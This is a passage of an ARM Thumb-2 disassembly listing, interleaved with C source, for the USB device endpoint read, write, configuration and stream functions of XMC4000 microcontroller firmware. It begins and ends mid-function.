 80030da:	68db      	ldr	r3, [r3, #12]
 80030dc:	4413      	add	r3, r2
 80030de:	781b      	ldrb	r3, [r3, #0]
 80030e0:	71bb      	strb	r3, [r7, #6]
          EndPoint->OutOffset++;
 80030e2:	683b      	ldr	r3, [r7, #0]
 80030e4:	68db      	ldr	r3, [r3, #12]
 80030e6:	1c5a      	adds	r2, r3, #1
 80030e8:	683b      	ldr	r3, [r7, #0]
 80030ea:	60da      	str	r2, [r3, #12]
          EndPoint->OutBytesAvailable--;
 80030ec:	683b      	ldr	r3, [r7, #0]
 80030ee:	689b      	ldr	r3, [r3, #8]
 80030f0:	1e5a      	subs	r2, r3, #1
 80030f2:	683b      	ldr	r3, [r7, #0]
 80030f4:	609a      	str	r2, [r3, #8]
		  Success = true;
 80030f6:	2301      	movs	r3, #1
 80030f8:	71fb      	strb	r3, [r7, #7]
		}
	  }while(!Success);
 80030fa:	79fb      	ldrb	r3, [r7, #7]
 80030fc:	f083 0301 	eor.w	r3, r3, #1
 8003100:	b2db      	uxtb	r3, r3
 8003102:	2b00      	cmp	r3, #0
 8003104:	d1e2      	bne.n	80030cc <Endpoint_Read_8+0x24>
	 return data;
 8003106:	79bb      	ldrb	r3, [r7, #6]
}
 8003108:	4618      	mov	r0, r3
 800310a:	370c      	adds	r7, #12
 800310c:	46bd      	mov	sp, r7
 800310e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003112:	4770      	bx	lr
 8003114:	2000070c 	.word	0x2000070c

08003118 <Endpoint_Write_32_LE>:

void Endpoint_Write_32_LE(const uint32_t Data) {
 8003118:	b480      	push	{r7}
 800311a:	b085      	sub	sp, #20
 800311c:	af00      	add	r7, sp, #0
 800311e:	6078      	str	r0, [r7, #4]
	USBD_Endpoint_t *EndPoint = &device.Endpoints[device.CurrentEndpoint];
 8003120:	4b17      	ldr	r3, [pc, #92]	; (8003180 <Endpoint_Write_32_LE+0x68>)
 8003122:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 8003126:	461a      	mov	r2, r3
 8003128:	232c      	movs	r3, #44	; 0x2c
 800312a:	fb02 f303 	mul.w	r3, r2, r3
 800312e:	4a14      	ldr	r2, [pc, #80]	; (8003180 <Endpoint_Write_32_LE+0x68>)
 8003130:	4413      	add	r3, r2
 8003132:	3304      	adds	r3, #4
 8003134:	60bb      	str	r3, [r7, #8]
	bool Success = false;
 8003136:	2300      	movs	r3, #0
 8003138:	73fb      	strb	r3, [r7, #15]

	do {
		if(EndPoint->InBytesAvailable < (EndPoint->InBufferLength - 3)) {
 800313a:	68bb      	ldr	r3, [r7, #8]
 800313c:	699a      	ldr	r2, [r3, #24]
 800313e:	68bb      	ldr	r3, [r7, #8]
 8003140:	6a1b      	ldr	r3, [r3, #32]
 8003142:	3b03      	subs	r3, #3
 8003144:	429a      	cmp	r2, r3
 8003146:	d20d      	bcs.n	8003164 <Endpoint_Write_32_LE+0x4c>
			*(uint32_t*)(EndPoint->InBuffer + EndPoint->InBytesAvailable) = Data;
 8003148:	68bb      	ldr	r3, [r7, #8]
 800314a:	69da      	ldr	r2, [r3, #28]
 800314c:	68bb      	ldr	r3, [r7, #8]
 800314e:	699b      	ldr	r3, [r3, #24]
 8003150:	4413      	add	r3, r2
 8003152:	687a      	ldr	r2, [r7, #4]
 8003154:	601a      	str	r2, [r3, #0]
			EndPoint->InBytesAvailable+=4;
 8003156:	68bb      	ldr	r3, [r7, #8]
 8003158:	699b      	ldr	r3, [r3, #24]
 800315a:	1d1a      	adds	r2, r3, #4
 800315c:	68bb      	ldr	r3, [r7, #8]
 800315e:	619a      	str	r2, [r3, #24]

			Success = true;
 8003160:	2301      	movs	r3, #1
 8003162:	73fb      	strb	r3, [r7, #15]
		}
	}while(!Success);
 8003164:	7bfb      	ldrb	r3, [r7, #15]
 8003166:	f083 0301 	eor.w	r3, r3, #1
 800316a:	b2db      	uxtb	r3, r3
 800316c:	2b00      	cmp	r3, #0
 800316e:	d1e4      	bne.n	800313a <Endpoint_Write_32_LE+0x22>
}
 8003170:	bf00      	nop
 8003172:	bf00      	nop
 8003174:	3714      	adds	r7, #20
 8003176:	46bd      	mov	sp, r7
 8003178:	f85d 7b04 	ldr.w	r7, [sp], #4
 800317c:	4770      	bx	lr
 800317e:	bf00      	nop
 8003180:	2000070c 	.word	0x2000070c

08003184 <Endpoint_Read_32_LE>:

uint32_t Endpoint_Read_32_LE(void) {
 8003184:	b480      	push	{r7}
 8003186:	b085      	sub	sp, #20
 8003188:	af00      	add	r7, sp, #0
	USBD_Endpoint_t *EndPoint = &device.Endpoints[device.CurrentEndpoint];
 800318a:	4b19      	ldr	r3, [pc, #100]	; (80031f0 <Endpoint_Read_32_LE+0x6c>)
 800318c:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 8003190:	461a      	mov	r2, r3
 8003192:	232c      	movs	r3, #44	; 0x2c
 8003194:	fb02 f303 	mul.w	r3, r2, r3
 8003198:	4a15      	ldr	r2, [pc, #84]	; (80031f0 <Endpoint_Read_32_LE+0x6c>)
 800319a:	4413      	add	r3, r2
 800319c:	3304      	adds	r3, #4
 800319e:	607b      	str	r3, [r7, #4]
	bool Success = false;
 80031a0:	2300      	movs	r3, #0
 80031a2:	73fb      	strb	r3, [r7, #15]
	uint32_t data = 0;
 80031a4:	2300      	movs	r3, #0
 80031a6:	60bb      	str	r3, [r7, #8]

	do {
		if(EndPoint->OutBytesAvailable > 3) {
 80031a8:	687b      	ldr	r3, [r7, #4]
 80031aa:	689b      	ldr	r3, [r3, #8]
 80031ac:	2b03      	cmp	r3, #3
 80031ae:	d912      	bls.n	80031d6 <Endpoint_Read_32_LE+0x52>
			data = *(uint32_t*)(EndPoint->OutBuffer + EndPoint->OutOffset);
 80031b0:	687b      	ldr	r3, [r7, #4]
 80031b2:	691a      	ldr	r2, [r3, #16]
 80031b4:	687b      	ldr	r3, [r7, #4]
 80031b6:	68db      	ldr	r3, [r3, #12]
 80031b8:	4413      	add	r3, r2
 80031ba:	681b      	ldr	r3, [r3, #0]
 80031bc:	60bb      	str	r3, [r7, #8]
			EndPoint->OutOffset+=4;
 80031be:	687b      	ldr	r3, [r7, #4]
 80031c0:	68db      	ldr	r3, [r3, #12]
 80031c2:	1d1a      	adds	r2, r3, #4
 80031c4:	687b      	ldr	r3, [r7, #4]
 80031c6:	60da      	str	r2, [r3, #12]
			EndPoint->OutBytesAvailable-=4;
 80031c8:	687b      	ldr	r3, [r7, #4]
 80031ca:	689b      	ldr	r3, [r3, #8]
 80031cc:	1f1a      	subs	r2, r3, #4
 80031ce:	687b      	ldr	r3, [r7, #4]
 80031d0:	609a      	str	r2, [r3, #8]

			Success = true;
 80031d2:	2301      	movs	r3, #1
 80031d4:	73fb      	strb	r3, [r7, #15]
		}
	} while(!Success);
 80031d6:	7bfb      	ldrb	r3, [r7, #15]
 80031d8:	f083 0301 	eor.w	r3, r3, #1
 80031dc:	b2db      	uxtb	r3, r3
 80031de:	2b00      	cmp	r3, #0
 80031e0:	d1e2      	bne.n	80031a8 <Endpoint_Read_32_LE+0x24>
	return data;
 80031e2:	68bb      	ldr	r3, [r7, #8]
}
 80031e4:	4618      	mov	r0, r3
 80031e6:	3714      	adds	r7, #20
 80031e8:	46bd      	mov	sp, r7
 80031ea:	f85d 7b04 	ldr.w	r7, [sp], #4
 80031ee:	4770      	bx	lr
 80031f0:	2000070c 	.word	0x2000070c

080031f4 <Endpoint_ConfigureEndpointTable>:

bool Endpoint_ConfigureEndpointTable(const USB_Endpoint_Table_t* const Table,
			                                     const uint8_t Entries) {
 80031f4:	b590      	push	{r4, r7, lr}
 80031f6:	b085      	sub	sp, #20
 80031f8:	af00      	add	r7, sp, #0
 80031fa:	6078      	str	r0, [r7, #4]
 80031fc:	460b      	mov	r3, r1
 80031fe:	70fb      	strb	r3, [r7, #3]
	uint8_t i;
	uint8_t Number;
	for (i=0;i<Entries;i++) {
 8003200:	2300      	movs	r3, #0
 8003202:	73fb      	strb	r3, [r7, #15]
 8003204:	e092      	b.n	800332c <Endpoint_ConfigureEndpointTable+0x138>
		Number = Table[i].Address & ENDPOINT_EPNUM_MASK;
 8003206:	7bfa      	ldrb	r2, [r7, #15]
 8003208:	4613      	mov	r3, r2
 800320a:	005b      	lsls	r3, r3, #1
 800320c:	4413      	add	r3, r2
 800320e:	005b      	lsls	r3, r3, #1
 8003210:	461a      	mov	r2, r3
 8003212:	687b      	ldr	r3, [r7, #4]
 8003214:	4413      	add	r3, r2
 8003216:	781b      	ldrb	r3, [r3, #0]
 8003218:	f003 030f 	and.w	r3, r3, #15
 800321c:	73bb      	strb	r3, [r7, #14]
		/* Configure endpoint in device controller driver */
		if (device.Driver->EndpointConfigure(Table[i].Address, (XMC_USBD_ENDPOINT_TYPE_t)Table[i].Type, Table[i].Size) != XMC_USBD_STATUS_OK)
 800321e:	4b48      	ldr	r3, [pc, #288]	; (8003340 <Endpoint_ConfigureEndpointTable+0x14c>)
 8003220:	681b      	ldr	r3, [r3, #0]
 8003222:	69dc      	ldr	r4, [r3, #28]
 8003224:	7bfa      	ldrb	r2, [r7, #15]
 8003226:	4613      	mov	r3, r2
 8003228:	005b      	lsls	r3, r3, #1
 800322a:	4413      	add	r3, r2
 800322c:	005b      	lsls	r3, r3, #1
 800322e:	461a      	mov	r2, r3
 8003230:	687b      	ldr	r3, [r7, #4]
 8003232:	4413      	add	r3, r2
 8003234:	7818      	ldrb	r0, [r3, #0]
 8003236:	7bfa      	ldrb	r2, [r7, #15]
 8003238:	4613      	mov	r3, r2
 800323a:	005b      	lsls	r3, r3, #1
 800323c:	4413      	add	r3, r2
 800323e:	005b      	lsls	r3, r3, #1
 8003240:	461a      	mov	r2, r3
 8003242:	687b      	ldr	r3, [r7, #4]
 8003244:	4413      	add	r3, r2
 8003246:	7919      	ldrb	r1, [r3, #4]
 8003248:	7bfa      	ldrb	r2, [r7, #15]
 800324a:	4613      	mov	r3, r2
 800324c:	005b      	lsls	r3, r3, #1
 800324e:	4413      	add	r3, r2
 8003250:	005b      	lsls	r3, r3, #1
 8003252:	461a      	mov	r2, r3
 8003254:	687b      	ldr	r3, [r7, #4]
 8003256:	4413      	add	r3, r2
 8003258:	885b      	ldrh	r3, [r3, #2]
 800325a:	461a      	mov	r2, r3
 800325c:	47a0      	blx	r4
 800325e:	4603      	mov	r3, r0
 8003260:	2b00      	cmp	r3, #0
 8003262:	d001      	beq.n	8003268 <Endpoint_ConfigureEndpointTable+0x74>
			return false;
 8003264:	2300      	movs	r3, #0
 8003266:	e067      	b.n	8003338 <Endpoint_ConfigureEndpointTable+0x144>
		/* Set device core values */
		device.Endpoints[Number].Address = Table[i].Address;
 8003268:	7bfa      	ldrb	r2, [r7, #15]
 800326a:	4613      	mov	r3, r2
 800326c:	005b      	lsls	r3, r3, #1
 800326e:	4413      	add	r3, r2
 8003270:	005b      	lsls	r3, r3, #1
 8003272:	461a      	mov	r2, r3
 8003274:	687b      	ldr	r3, [r7, #4]
 8003276:	441a      	add	r2, r3
 8003278:	7bbb      	ldrb	r3, [r7, #14]
 800327a:	7810      	ldrb	r0, [r2, #0]
 800327c:	4a30      	ldr	r2, [pc, #192]	; (8003340 <Endpoint_ConfigureEndpointTable+0x14c>)
 800327e:	212c      	movs	r1, #44	; 0x2c
 8003280:	fb01 f303 	mul.w	r3, r1, r3
 8003284:	4413      	add	r3, r2
 8003286:	3304      	adds	r3, #4
 8003288:	4602      	mov	r2, r0
 800328a:	701a      	strb	r2, [r3, #0]
		device.Endpoints[Number].MaxPacketSize = Table[i].Size;
 800328c:	7bfa      	ldrb	r2, [r7, #15]
 800328e:	4613      	mov	r3, r2
 8003290:	005b      	lsls	r3, r3, #1
 8003292:	4413      	add	r3, r2
 8003294:	005b      	lsls	r3, r3, #1
 8003296:	461a      	mov	r2, r3
 8003298:	687b      	ldr	r3, [r7, #4]
 800329a:	4413      	add	r3, r2
 800329c:	885a      	ldrh	r2, [r3, #2]
 800329e:	7bbb      	ldrb	r3, [r7, #14]
 80032a0:	f002 027f 	and.w	r2, r2, #127	; 0x7f
 80032a4:	b2d1      	uxtb	r1, r2
 80032a6:	4a26      	ldr	r2, [pc, #152]	; (8003340 <Endpoint_ConfigureEndpointTable+0x14c>)
 80032a8:	202c      	movs	r0, #44	; 0x2c
 80032aa:	fb00 f303 	mul.w	r3, r0, r3
 80032ae:	441a      	add	r2, r3
 80032b0:	8913      	ldrh	r3, [r2, #8]
 80032b2:	f361 138c 	bfi	r3, r1, #6, #7
 80032b6:	8113      	strh	r3, [r2, #8]
		device.Endpoints[Number].IsConfigured = 1;
 80032b8:	7bbb      	ldrb	r3, [r7, #14]
 80032ba:	4a21      	ldr	r2, [pc, #132]	; (8003340 <Endpoint_ConfigureEndpointTable+0x14c>)
 80032bc:	212c      	movs	r1, #44	; 0x2c
 80032be:	fb01 f303 	mul.w	r3, r1, r3
 80032c2:	441a      	add	r2, r3
 80032c4:	7a13      	ldrb	r3, [r2, #8]
 80032c6:	f043 0301 	orr.w	r3, r3, #1
 80032ca:	7213      	strb	r3, [r2, #8]
		device.Endpoints[Number].IsEnabled = 1;
 80032cc:	7bbb      	ldrb	r3, [r7, #14]
 80032ce:	4a1c      	ldr	r2, [pc, #112]	; (8003340 <Endpoint_ConfigureEndpointTable+0x14c>)
 80032d0:	212c      	movs	r1, #44	; 0x2c
 80032d2:	fb01 f303 	mul.w	r3, r1, r3
 80032d6:	441a      	add	r2, r3
 80032d8:	7a13      	ldrb	r3, [r2, #8]
 80032da:	f043 0302 	orr.w	r3, r3, #2
 80032de:	7213      	strb	r3, [r2, #8]
		/* Start read for out endpoints */
		if (!(Table[i].Address & ENDPOINT_DIR_MASK))
 80032e0:	7bfa      	ldrb	r2, [r7, #15]
 80032e2:	4613      	mov	r3, r2
 80032e4:	005b      	lsls	r3, r3, #1
 80032e6:	4413      	add	r3, r2
 80032e8:	005b      	lsls	r3, r3, #1
 80032ea:	461a      	mov	r2, r3
 80032ec:	687b      	ldr	r3, [r7, #4]
 80032ee:	4413      	add	r3, r2
 80032f0:	781b      	ldrb	r3, [r3, #0]
 80032f2:	b25b      	sxtb	r3, r3
 80032f4:	2b00      	cmp	r3, #0
 80032f6:	db16      	blt.n	8003326 <Endpoint_ConfigureEndpointTable+0x132>
			device.Driver->EndpointReadStart(Table[i].Address,
 80032f8:	4b11      	ldr	r3, [pc, #68]	; (8003340 <Endpoint_ConfigureEndpointTable+0x14c>)
 80032fa:	681b      	ldr	r3, [r3, #0]
 80032fc:	6a9c      	ldr	r4, [r3, #40]	; 0x28
 80032fe:	7bfa      	ldrb	r2, [r7, #15]
 8003300:	4613      	mov	r3, r2
 8003302:	005b      	lsls	r3, r3, #1
 8003304:	4413      	add	r3, r2
 8003306:	005b      	lsls	r3, r3, #1
 8003308:	461a      	mov	r2, r3
 800330a:	687b      	ldr	r3, [r7, #4]
 800330c:	4413      	add	r3, r2
 800330e:	781a      	ldrb	r2, [r3, #0]
 8003310:	7bbb      	ldrb	r3, [r7, #14]
 8003312:	490b      	ldr	r1, [pc, #44]	; (8003340 <Endpoint_ConfigureEndpointTable+0x14c>)
 8003314:	202c      	movs	r0, #44	; 0x2c
 8003316:	fb00 f303 	mul.w	r3, r0, r3
 800331a:	440b      	add	r3, r1
 800331c:	3318      	adds	r3, #24
 800331e:	681b      	ldr	r3, [r3, #0]
 8003320:	4619      	mov	r1, r3
 8003322:	4610      	mov	r0, r2
 8003324:	47a0      	blx	r4
	for (i=0;i<Entries;i++) {
 8003326:	7bfb      	ldrb	r3, [r7, #15]
 8003328:	3301      	adds	r3, #1
 800332a:	73fb      	strb	r3, [r7, #15]
 800332c:	7bfa      	ldrb	r2, [r7, #15]
 800332e:	78fb      	ldrb	r3, [r7, #3]
 8003330:	429a      	cmp	r2, r3
 8003332:	f4ff af68 	bcc.w	8003206 <Endpoint_ConfigureEndpointTable+0x12>
					device.Endpoints[Number].OutBufferLength);
	}
	return true;
 8003336:	2301      	movs	r3, #1
}
 8003338:	4618      	mov	r0, r3
 800333a:	3714      	adds	r7, #20
 800333c:	46bd      	mov	sp, r7
 800333e:	bd90      	pop	{r4, r7, pc}
 8003340:	2000070c 	.word	0x2000070c

08003344 <Endpoint_Write_Stream_LE>:

#if defined(USB_CAN_BE_DEVICE)

#include "EndpointStream_XMC4000.h"

uint8_t Endpoint_Write_Stream_LE (const void *const Buffer, uint16_t Length, uint16_t *const BytesProcessed)  {
 8003344:	b580      	push	{r7, lr}
 8003346:	b088      	sub	sp, #32
 8003348:	af00      	add	r7, sp, #0
 800334a:	60f8      	str	r0, [r7, #12]
 800334c:	460b      	mov	r3, r1
 800334e:	607a      	str	r2, [r7, #4]
 8003350:	817b      	strh	r3, [r7, #10]
	USBD_Endpoint_t* ep = &device.Endpoints[device.CurrentEndpoint];
 8003352:	4b3f      	ldr	r3, [pc, #252]	; (8003450 <Endpoint_Write_Stream_LE+0x10c>)
 8003354:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 8003358:	461a      	mov	r2, r3
 800335a:	232c      	movs	r3, #44	; 0x2c
 800335c:	fb02 f303 	mul.w	r3, r2, r3
 8003360:	4a3b      	ldr	r2, [pc, #236]	; (8003450 <Endpoint_Write_Stream_LE+0x10c>)
 8003362:	4413      	add	r3, r2
 8003364:	3304      	adds	r3, #4
 8003366:	61bb      	str	r3, [r7, #24]
	uint16_t Bytes = 0;
 8003368:	2300      	movs	r3, #0
 800336a:	82fb      	strh	r3, [r7, #22]
	uint16_t BytesTransfered = 0;
 800336c:	2300      	movs	r3, #0
 800336e:	83fb      	strh	r3, [r7, #30]
	uint8_t ErrorCode;
	uint16_t prev_length = 0;
 8003370:	2300      	movs	r3, #0
 8003372:	83bb      	strh	r3, [r7, #28]
	if (BytesProcessed!=NULL) {
 8003374:	687b      	ldr	r3, [r7, #4]
 8003376:	2b00      	cmp	r3, #0
 8003378:	d052      	beq.n	8003420 <Endpoint_Write_Stream_LE+0xdc>
		Length -= *BytesProcessed;
 800337a:	687b      	ldr	r3, [r7, #4]
 800337c:	881b      	ldrh	r3, [r3, #0]
 800337e:	897a      	ldrh	r2, [r7, #10]
 8003380:	1ad3      	subs	r3, r2, r3
 8003382:	817b      	strh	r3, [r7, #10]
		BytesTransfered = *BytesProcessed;
 8003384:	687b      	ldr	r3, [r7, #4]
 8003386:	881b      	ldrh	r3, [r3, #0]
 8003388:	83fb      	strh	r3, [r7, #30]
	}

	while (Length) {
 800338a:	e049      	b.n	8003420 <Endpoint_Write_Stream_LE+0xdc>
		if (ep->InInUse)
 800338c:	69bb      	ldr	r3, [r7, #24]
 800338e:	685b      	ldr	r3, [r3, #4]
 8003390:	f3c3 1300 	ubfx	r3, r3, #4, #1
 8003394:	b2db      	uxtb	r3, r3
 8003396:	2b00      	cmp	r3, #0
 8003398:	d000      	beq.n	800339c <Endpoint_Write_Stream_LE+0x58>
			continue;
 800339a:	e041      	b.n	8003420 <Endpoint_Write_Stream_LE+0xdc>
		if (Endpoint_IsReadWriteAllowed()) {
 800339c:	f7ff fe1c 	bl	8002fd8 <Endpoint_IsReadWriteAllowed>
 80033a0:	4603      	mov	r3, r0
 80033a2:	2b00      	cmp	r3, #0
 80033a4:	d029      	beq.n	80033fa <Endpoint_Write_Stream_LE+0xb6>
			Bytes = ep->InBufferLength - ep->InBytesAvailable  > Length ? Length : ep->InBufferLength - ep->InBytesAvailable;
 80033a6:	69bb      	ldr	r3, [r7, #24]
 80033a8:	6a1a      	ldr	r2, [r3, #32]
 80033aa:	69bb      	ldr	r3, [r7, #24]
 80033ac:	699b      	ldr	r3, [r3, #24]
 80033ae:	1ad2      	subs	r2, r2, r3
 80033b0:	897b      	ldrh	r3, [r7, #10]
 80033b2:	4293      	cmp	r3, r2
 80033b4:	bf28      	it	cs
 80033b6:	4613      	movcs	r3, r2
 80033b8:	82fb      	strh	r3, [r7, #22]
			MEMCPY((void *)((uint32_t)ep->InBuffer + (uint32_t)ep->InBytesAvailable), (void *)((uint32_t)Buffer + (uint32_t)BytesTransfered), Bytes);
 80033ba:	69bb      	ldr	r3, [r7, #24]
 80033bc:	69db      	ldr	r3, [r3, #28]
 80033be:	461a      	mov	r2, r3
 80033c0:	69bb      	ldr	r3, [r7, #24]
 80033c2:	699b      	ldr	r3, [r3, #24]
 80033c4:	4413      	add	r3, r2
 80033c6:	4618      	mov	r0, r3
 80033c8:	8bfa      	ldrh	r2, [r7, #30]
 80033ca:	68fb      	ldr	r3, [r7, #12]
 80033cc:	4413      	add	r3, r2
 80033ce:	4619      	mov	r1, r3
 80033d0:	8afb      	ldrh	r3, [r7, #22]
 80033d2:	461a      	mov	r2, r3
 80033d4:	f7ff fc48 	bl	8002c68 <thumb2_memcpy>
			ep->InBytesAvailable += Bytes;
 80033d8:	69bb      	ldr	r3, [r7, #24]
 80033da:	699a      	ldr	r2, [r3, #24]
 80033dc:	8afb      	ldrh	r3, [r7, #22]
 80033de:	441a      	add	r2, r3
 80033e0:	69bb      	ldr	r3, [r7, #24]
 80033e2:	619a      	str	r2, [r3, #24]
			BytesTransfered += Bytes;
 80033e4:	8bfa      	ldrh	r2, [r7, #30]
 80033e6:	8afb      	ldrh	r3, [r7, #22]
 80033e8:	4413      	add	r3, r2
 80033ea:	83fb      	strh	r3, [r7, #30]
			prev_length = Length;
 80033ec:	897b      	ldrh	r3, [r7, #10]
 80033ee:	83bb      	strh	r3, [r7, #28]
			Length -= Bytes;
 80033f0:	897a      	ldrh	r2, [r7, #10]
 80033f2:	8afb      	ldrh	r3, [r7, #22]
 80033f4:	1ad3      	subs	r3, r2, r3
 80033f6:	817b      	strh	r3, [r7, #10]
 80033f8:	e012      	b.n	8003420 <Endpoint_Write_Stream_LE+0xdc>
		}
		else {
			Endpoint_ClearIN();
 80033fa:	f7ff fd75 	bl	8002ee8 <Endpoint_ClearIN>
			if (BytesProcessed!=NULL) {
 80033fe:	687b      	ldr	r3, [r7, #4]
 8003400:	2b00      	cmp	r3, #0
 8003402:	d004      	beq.n	800340e <Endpoint_Write_Stream_LE+0xca>
				*BytesProcessed = BytesTransfered;
 8003404:	687b      	ldr	r3, [r7, #4]
 8003406:	8bfa      	ldrh	r2, [r7, #30]
 8003408:	801a      	strh	r2, [r3, #0]
				return ENDPOINT_RWSTREAM_IncompleteTransfer;
 800340a:	2305      	movs	r3, #5
 800340c:	e01b      	b.n	8003446 <Endpoint_Write_Stream_LE+0x102>
			}

			if ((ErrorCode = Endpoint_WaitUntilReady()) != 0) {
 800340e:	f7ff fc8d 	bl	8002d2c <Endpoint_WaitUntilReady>
 8003412:	4603      	mov	r3, r0
 8003414:	757b      	strb	r3, [r7, #21]
 8003416:	7d7b      	ldrb	r3, [r7, #21]
 8003418:	2b00      	cmp	r3, #0
 800341a:	d001      	beq.n	8003420 <Endpoint_Write_Stream_LE+0xdc>
				return ErrorCode;
 800341c:	7d7b      	ldrb	r3, [r7, #21]
 800341e:	e012      	b.n	8003446 <Endpoint_Write_Stream_LE+0x102>
	while (Length) {
 8003420:	897b      	ldrh	r3, [r7, #10]
 8003422:	2b00      	cmp	r3, #0
 8003424:	d1b2      	bne.n	800338c <Endpoint_Write_Stream_LE+0x48>


		}
	}
	
	if((Length == 0) && (prev_length == ep->MaxPacketSize))
 8003426:	897b      	ldrh	r3, [r7, #10]
 8003428:	2b00      	cmp	r3, #0
 800342a:	d10b      	bne.n	8003444 <Endpoint_Write_Stream_LE+0x100>
 800342c:	69bb      	ldr	r3, [r7, #24]
 800342e:	889b      	ldrh	r3, [r3, #4]
 8003430:	f3c3 1386 	ubfx	r3, r3, #6, #7
 8003434:	b2db      	uxtb	r3, r3
 8003436:	b29b      	uxth	r3, r3
 8003438:	8bba      	ldrh	r2, [r7, #28]
 800343a:	429a      	cmp	r2, r3
 800343c:	d102      	bne.n	8003444 <Endpoint_Write_Stream_LE+0x100>
	{
	   zlp_flag = true;
 800343e:	4b05      	ldr	r3, [pc, #20]	; (8003454 <Endpoint_Write_Stream_LE+0x110>)
 8003440:	2201      	movs	r2, #1
 8003442:	701a      	strb	r2, [r3, #0]
	}
	return ENDPOINT_RWSTREAM_NoError;
 8003444:	2300      	movs	r3, #0
}
 8003446:	4618      	mov	r0, r3
 8003448:	3720      	adds	r7, #32
 800344a:	46bd      	mov	sp, r7
 800344c:	bd80      	pop	{r7, pc}
 800344e:	bf00      	nop
 8003450:	2000070c 	.word	0x2000070c
 8003454:	20000708 	.word	0x20000708

08003458 <SwapCopy>:

void SwapCopy(void *const Dest, const void *const Src,uint32_t Length) {
 8003458:	b480      	push	{r7}
 800345a:	b087      	sub	sp, #28
 800345c:	af00      	add	r7, sp, #0
 800345e:	60f8      	str	r0, [r7, #12]
 8003460:	60b9      	str	r1, [r7, #8]
 8003462:	607a      	str	r2, [r7, #4]
	uint32_t i = 0;
 8003464:	2300      	movs	r3, #0
 8003466:	617b      	str	r3, [r7, #20]
	while(i<Length) {
 8003468:	e00e      	b.n	8003488 <SwapCopy+0x30>
		*(uint8_t*)((uint32_t)Dest + (Length - 1 - i)) = *(uint8_t*)((uint32_t)Src + i);
 800346a:	68ba      	ldr	r2, [r7, #8]
 800346c:	697b      	ldr	r3, [r7, #20]
 800346e:	4413      	add	r3, r2
 8003470:	4619      	mov	r1, r3
 8003472:	687a      	ldr	r2, [r7, #4]
 8003474:	697b      	ldr	r3, [r7, #20]
 8003476:	1ad2      	subs	r2, r2, r3
 8003478:	68fb      	ldr	r3, [r7, #12]
 800347a:	4413      	add	r3, r2
 800347c:	3b01      	subs	r3, #1
 800347e:	780a      	ldrb	r2, [r1, #0]
 8003480:	701a      	strb	r2, [r3, #0]
		i++;
 8003482:	697b      	ldr	r3, [r7, #20]
 8003484:	3301      	adds	r3, #1
 8003486:	617b      	str	r3, [r7, #20]
	while(i<Length) {
 8003488:	697a      	ldr	r2, [r7, #20]
 800348a:	687b      	ldr	r3, [r7, #4]
 800348c:	429a      	cmp	r2, r3
 800348e:	d3ec      	bcc.n	800346a <SwapCopy+0x12>
	}
}
 8003490:	bf00      	nop
 8003492:	bf00      	nop
 8003494:	371c      	adds	r7, #28
 8003496:	46bd      	mov	sp, r7
 8003498:	f85d 7b04 	ldr.w	r7, [sp], #4
 800349c:	4770      	bx	lr
	...

080034a0 <Endpoint_Write_Stream_BE>:
uint8_t	Endpoint_Write_Stream_BE (const void *const Buffer, uint16_t Length, uint16_t *const BytesProcessed) {
 80034a0:	b580      	push	{r7, lr}
 80034a2:	b088      	sub	sp, #32
 80034a4:	af00      	add	r7, sp, #0
 80034a6:	60f8      	str	r0, [r7, #12]
 80034a8:	460b      	mov	r3, r1
 80034aa:	607a      	str	r2, [r7, #4]
 80034ac:	817b      	strh	r3, [r7, #10]
	USBD_Endpoint_t* ep = &device.Endpoints[device.CurrentEndpoint];
 80034ae:	4b35      	ldr	r3, [pc, #212]	; (8003584 <Endpoint_Write_Stream_BE+0xe4>)
 80034b0:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 80034b4:	461a      	mov	r2, r3
 80034b6:	232c      	movs	r3, #44	; 0x2c
 80034b8:	fb02 f303 	mul.w	r3, r2, r3
 80034bc:	4a31      	ldr	r2, [pc, #196]	; (8003584 <Endpoint_Write_Stream_BE+0xe4>)
 80034be:	4413      	add	r3, r2
 80034c0:	3304      	adds	r3, #4
 80034c2:	61bb      	str	r3, [r7, #24]
	uint16_t Bytes = 0;
 80034c4:	2300      	movs	r3, #0
 80034c6:	82fb      	strh	r3, [r7, #22]
	uint16_t BytesTransfered = 0;
 80034c8:	2300      	movs	r3, #0
 80034ca:	83fb      	strh	r3, [r7, #30]
	uint8_t ErrorCode;

	if (BytesProcessed!=NULL) {
 80034cc:	687b      	ldr	r3, [r7, #4]
 80034ce:	2b00      	cmp	r3, #0
 80034d0:	d050      	beq.n	8003574 <Endpoint_Write_Stream_BE+0xd4>
		Length -= *BytesProcessed;
 80034d2:	687b      	ldr	r3, [r7, #4]
 80034d4:	881b      	ldrh	r3, [r3, #0]
 80034d6:	897a      	ldrh	r2, [r7, #10]
 80034d8:	1ad3      	subs	r3, r2, r3
 80034da:	817b      	strh	r3, [r7, #10]
		BytesTransfered = *BytesProcessed;
 80034dc:	687b      	ldr	r3, [r7, #4]
 80034de:	881b      	ldrh	r3, [r3, #0]
 80034e0:	83fb      	strh	r3, [r7, #30]
	}

	while (Length) {
 80034e2:	e047      	b.n	8003574 <Endpoint_Write_Stream_BE+0xd4>
		if (ep->InInUse)
 80034e4:	69bb      	ldr	r3, [r7, #24]
 80034e6:	685b      	ldr	r3, [r3, #4]
 80034e8:	f3c3 1300 	ubfx	r3, r3, #4, #1
 80034ec:	b2db      	uxtb	r3, r3
 80034ee:	2b00      	cmp	r3, #0
 80034f0:	d000      	beq.n	80034f4 <Endpoint_Write_Stream_BE+0x54>
			continue;
 80034f2:	e03f      	b.n	8003574 <Endpoint_Write_Stream_BE+0xd4>
		if (Endpoint_IsReadWriteAllowed()) {
 80034f4:	f7ff fd70 	bl	8002fd8 <Endpoint_IsReadWriteAllowed>
 80034f8:	4603      	mov	r3, r0
 80034fa:	2b00      	cmp	r3, #0
 80034fc:	d027      	beq.n	800354e <Endpoint_Write_Stream_BE+0xae>
			Bytes = ep->InBufferLength - ep->InBytesAvailable  > Length ? Length : ep->InBufferLength - ep->InBytesAvailable;
 80034fe:	69bb      	ldr	r3, [r7, #24]
 8003500:	6a1a      	ldr	r2, [r3, #32]
 8003502:	69bb      	ldr	r3, [r7, #24]
 8003504:	699b      	ldr	r3, [r3, #24]
 8003506:	1ad2      	subs	r2, r2, r3
 8003508:	897b      	ldrh	r3, [r7, #10]
 800350a:	4293      	cmp	r3, r2
